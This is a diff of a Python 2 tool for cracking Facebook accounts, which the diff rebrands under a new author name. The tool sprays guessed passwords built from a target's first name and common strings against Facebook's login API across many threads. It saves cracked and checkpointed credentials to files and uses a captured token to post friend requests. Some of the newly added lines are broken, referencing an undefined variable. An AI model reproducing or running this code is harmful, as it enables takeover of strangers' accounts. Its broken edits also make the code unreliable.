@@ -1,9 +1,8 @@
 #!/usr/bin/python2
 #coding=utf-8
-#Codded By Muhammad Hamza
+#Codded By MUSKAN NOOR
 #Editing My Script Will Not Make You A Coder
-#Facebook : Faisal Rehman
-#Whatsapp : +92309-7992202
+#Facebook : MUSKAN NOOR
 #Pakistan Cyber Expert
 #Alone Coder 
 import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
@@ -70,24 +69,22 @@ def jalan(z):
 		time.sleep(0.1)
 ##### INTRO #####
 logo ="""
-  ______    _           _ 
- |  ____|  (_)         | |
- | |__ __ _ _ ___  __ _| |
- |  __/ _` | / __|/ _` | |
- | | | (_| | \__ \ (_| | |
- |_|  \__,_|_|___/\__,_|_|(Tanha)
-                          
-                          
----------------------------------------------------
- 
-➣  Coded By : Faisal Rehman
-➣  Facebook : Faisal Rehman
-➣  Note     : Dont ReEdit It 
-➣  Github   : https://github.com/faisal254
-➣  Whatsapp : +923035191880
-➣  Note     : Having Problem? Contact Me On Facebook Or Whatsapp.
-➣  Disclamiar : This Is For Educational Purpose Only . Iam Not Responsible For Any Illegal Use Or Activity.
----------------------------------------------------"""
+
+\x1b[1;93m░█████╗░░░░██╗░░██╗░░░░██████╗░
+\x1b[1;94m██╔══██╗░░░██║░██╔╝░░░██╔════╝░
+\x1b[1;93m██║░░╚═╝░░░█████═╝░░░░██║░░██╗░
+\x1b[1;94m██║░░██╗░░░██╔═██╗░░░░██║░░╚██╗
+\x1b[1;95m╚█████╔╝██╗██║░╚██╗██╗╚██████╔╝
+                           
+\x1b[1;97m---------------------------------------------------
+ \x1b[1;92m<<<<𝗖𝗥𝗔𝗭𝗬 𝗞𝗜𝗡𝗚 𝗚𝗔𝗡𝗚 𝗢𝗪𝗡𝗘𝗥 𝗠𝗨𝗦𝗞𝗔𝗡 𝗡𝗢𝗢𝗥>>>>
+\x1b[1;96m➣  Coded By : MUSKAN NOOR
+\x1b[1;96m➣  Facebook : Muskan Noor
+\x1b[1;96m➣  Note     : Dont ReEdit It 
+\x1b[1;96m➣  Note     : Having Problem? Contact Me On Facebook
+\x1b[1;96m➣  Disclamiar : This Is For Educational Purpose Only.
+Iam Not Responsible For Any Illegal Use Or Activity.
+\x1b[1;97m---------------------------------------------------"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -105,8 +102,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "tanha"
-CorrectPassword = "dil"
+CorrectUsername = "muskan"
+CorrectPassword = "noor"
 
 loop = 'true'
 while (loop == 'true'):
@@ -114,15 +111,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97mEnter Passcode \x1b[1;97m: \x1b[1;97m")
         if (password == CorrectPassword):
-            print "\033[1;97mAccess Granted "#Dev:Muhammad_Hamza
+            print "\033[1;97mAccess Granted "#Dev:Muskan_Noor
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
-            os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
+            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
+        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 def login():
 	os.system('clear')
 	try:
@@ -134,7 +131,7 @@ def login():
      	
 		
 		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mDonot Use Your Pesonal Account' ) 
+		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mMUSKAN NOOR QUEEN OF FACEBOOK' ) 
 		
 		print('	' )
 		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
@@ -167,7 +164,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
+				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -209,7 +206,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;97mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:hamz
+	os.system("clear") #Dev:muskan
 	print logo
 	print "  \033[1;97m        ⚡ \033[1;97mLogged in User Info\033[1;97m ⚡"
 	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
@@ -232,7 +229,7 @@ def hop():
 	elif hack =="1":
 		super()
 	elif hack =="2":
-	        os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
+	        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 	        menu()
         
 	elif hack =="0":
@@ -333,7 +330,7 @@ def pilih_super():
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 = 'Pakistan'										
+				    pass2 = '000786'										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:	
@@ -381,7 +378,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = b['first_name'] + '12345'							
+						                       pass5 = b['first_name'] + '1234'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -397,7 +394,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = b['first_name'] + 'khan'											
+							                           pass6 = b['first_name'] + '12345'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -413,7 +410,7 @@ def pilih_super():
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
-								                               pass7 = b['last_name'] + '786'			
+								                               pass7 = 'Pakistan'			
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:		
@@ -422,18 +419,20 @@ def pilih_super():
 									                               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass7					
 									                               oks.append(user+pass7)
                                                                                                else:
-			                                                                               if 'www.facebook.com' in q["error_msg"]:
-				                                                                           print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
-				                                                                           cek = open("out/super_cp.txt", "a")
-				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
-				                                                                           cek.close()
-				                                                                           cekpoint.append(user+pass7)
+                                                                                                       pass7 = 'Pakistan'
+                                                                                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                                                                                       q = json.load(data)
+                                                                                                       if 'access_token' in q:
+                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+                                                                                                               z = json.loads(x.text)
+                                                                                                               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass8					
+									                                       oks.append(user+pass7)
 																	
 															
 		except:
 			pass
 		
-	p = ThreadPool(50)
+	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m---------------------------------------------------"
 	
